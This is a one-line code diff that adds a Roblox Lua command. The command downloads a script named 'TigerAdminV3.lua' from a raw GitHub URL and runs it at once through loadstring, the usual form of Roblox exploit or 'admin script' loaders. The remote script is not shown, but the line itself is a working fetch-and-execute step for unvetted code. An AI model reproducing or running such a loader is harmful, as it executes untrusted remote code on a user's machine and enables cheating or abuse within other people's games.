@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Chaosscripter/Roblox/refs/heads/main/TigerAdminV3.lua"))()
